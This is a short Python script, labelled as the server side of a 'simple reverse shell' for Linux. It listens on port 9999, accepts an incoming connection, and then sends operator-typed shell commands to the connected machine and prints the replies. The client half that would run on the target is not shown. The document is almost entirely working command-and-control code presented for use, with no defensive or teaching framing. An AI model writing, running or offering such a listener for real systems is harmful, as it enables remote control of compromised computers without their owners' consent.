#Server Side Script
#!/usr/bin/env python

#############################################################
# #----- Simple Reverse shel anay Interface In Linux -----# #
#                                                           #
# #----- Created By : Eng-Mohmed Elsayed ----- #            #
#                                                           #
#############################################################
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = socket.gethostname()
port = 9999

s.bind((host,port))

print ("Waiting for connection...")
s.listen(5)

conn,addr = s.accept()
print ('Got Connection from', addr)
x='Server Saying Hi'.encode("utf-8")
while True:
    command=input("Shell > ")
    if 'terminate' in command:
        conn.send('terminate'.encode("utf-8"))
        conn.close()
        break
    else:
        conn.send(bytes(command.encode("utf-8")))
        print(conn.recv(20000).decode("utf-8"))
